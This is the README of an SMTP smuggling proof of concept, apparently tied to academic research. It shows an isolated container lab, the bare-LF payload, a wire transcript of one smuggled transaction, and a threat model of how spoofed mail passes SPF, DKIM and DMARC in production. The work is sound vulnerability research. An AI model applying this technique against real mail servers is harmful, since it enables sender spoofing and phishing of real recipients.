# SMTP smuggling PoC

Minimal demo of the parser-differential bug from Wang et al., USENIX
Security '25 (Table 1, payload A1: bare-LF dot bare-LF, `b"\n.\n"`).

## Files

- `poc_smuggle.py` — the entire PoC, ~30 lines, stdlib only
- `poc_smuggle.pcap` — wire capture of one PoC run, open with Wireshark

## Lab setup

The PoC requires two containerized MTAs talking to each other over an
isolated network. All of this runs locally via Podman — no real mail
servers, no internet access needed.

**Prerequisites** (install once):

```bash
# Debian/Kali
sudo apt install podman podman-compose python3 python3-venv wireshark
```

**Step 1 — clone and install the Python harness:**

```bash
git clone https://github.com/LVy-H/smtp-smuggling-lab
cd smtp-smuggling-lab
python3 -m venv .venv && source .venv/bin/activate
pip install -e '.[dev]'
```

**Step 2 — build the container images** (done once, takes ~2 min):

```bash
podman build --security-opt seccomp=unconfined -t smtp-lab-postfix:m0 lab/postfix/
podman build --security-opt seccomp=unconfined -t smtp-lab-dovecot:m0 lab/dovecot/
podman build --security-opt seccomp=unconfined -t smtp-lab-tcpdump:m0 lab/tcpdump-sidecar/
```

This builds three images:
- `smtp-lab-postfix:m0` — Postfix 3.7 on Debian 12, branched into sender and receiver roles
- `smtp-lab-dovecot:m0` — Dovecot for Maildir delivery
- `smtp-lab-tcpdump:m0` — tcpdump sidecar that shares the MTA's network namespace

**Step 3 — start the lab:**

```bash
TARGET_RECEIVER=postfix-receiver \
  podman-compose -f lab/podman-compose.yml --profile p2p up -d
```

This starts four containers on an isolated `10.89.2.0/24` bridge:

| Container | IP | Role |
|---|---|---|
| `postfix-sender` | 10.89.2.20 | Accepts mail from the harness on `127.0.0.1:2525`, relays to receiver |
| `postfix-receiver` | 10.89.2.10 | Receives and delivers mail to `bob`'s Maildir |
| `dovecot` | 10.89.2.30 | LMTP delivery backend |
| `tcpdump-sender-postfix` | (shares sender netns) | Captures port-25 traffic |

Port 2525 on `127.0.0.1` is the only port exposed to the host — no
traffic can reach a real mail server.

Wait ~6 seconds for Postfix to finish starting, then verify:

```bash
# Should print "220 sender.labnet.test ESMTP Postfix"
nc -q1 127.0.0.1 2525 < /dev/null
```

**Tear down:**

```bash
podman-compose -f lab/podman-compose.yml --profile p2p down
```

## Run

With the lab running:

```
python3 demo/poc_smuggle.py
```

The harness sends **one** SMTP transaction. The receiver delivers
**two** messages to `bob`'s mailbox: the legitimate carrier and a
smuggled message whose `From:` header is a spoofed sender:

```
$ podman exec postfix-receiver ls /home/bob/Maildir/new
1776184325.V10302I842c36M925037.receiver.labnet.test    # carrier
1776184325.V10302I842c3bM927044.receiver.labnet.test    # smuggled

# carrier:
From: hoang@uit.test
To: long@labnet.test
Subject: hello

# smuggled:
From: thaykhoa@labnet.test
To: bob@labnet.test
Subject: SMUGGLED
```

## What to look for in `poc_smuggle.pcap`

Open the capture in Wireshark, right-click any packet on TCP/25, choose
**Follow → TCP Stream**. You will see *two* SMTP sessions on the wire
between `postfix-sender` and `postfix-receiver`, even though the harness
only ran one transaction against `postfix-sender`:

```
EHLO sender.labnet.test
MAIL FROM:<alice@labnet.test>
RCPT TO:<bob@labnet.test>
DATA
... carrier body ...
hello
.
QUIT
EHLO sender.labnet.test
MAIL FROM:<thaykhoa@labnet.test>      <-- smuggled envelope
RCPT TO:<bob@labnet.test>             <-- local recipient
DATA
... smuggled body ...
-1
.
QUIT
```

`postfix-sender`'s parser treated the bare-LF dot bare-LF (`b"\n.\n"`)
as end-of-message, then re-emitted **two** clean RFC-conformant SMTP
transactions to `postfix-receiver`. Both inherit the upstream's
authentication.

## Why this is dangerous in production

Modern MTAs do **not** relay arbitrary mail by default — a public MX
will reject any `RCPT TO:<remote-domain>` with `554 5.7.1 Relay access
denied` unless the client authenticates. So the attack vector is **not**
"trick the receiver into relaying somewhere external."

The realistic threat model is a two-MTA chain where the attacker
authenticates legitimately with the **upstream** MTA and the receiver
is **authoritative** for the victim's domain:

```
attacker --auth--> upstream MTA  --SMTP-->  victim MX  --local--> bob@victim.com
                   (SaaS / ISP)             (authoritative for victim.com)
```

The smuggled mail's `RCPT TO` targets a recipient the victim MX is
already local for, so relay restrictions don't apply. SPF passes
because the bytes arrive from the upstream's allowlisted IP. DKIM
passes because the wrapper transmission is signed by the upstream.
DMARC passes because both align. The smuggled mail lands in bob's
mailbox under a spoofed `From:` header.

This PoC reproduces exactly that local-delivery shape: the smuggled
`RCPT TO:<bob@labnet.test>` is a recipient the lab receiver is
authoritative for, and the smuggled mail is delivered silently
alongside the carrier.
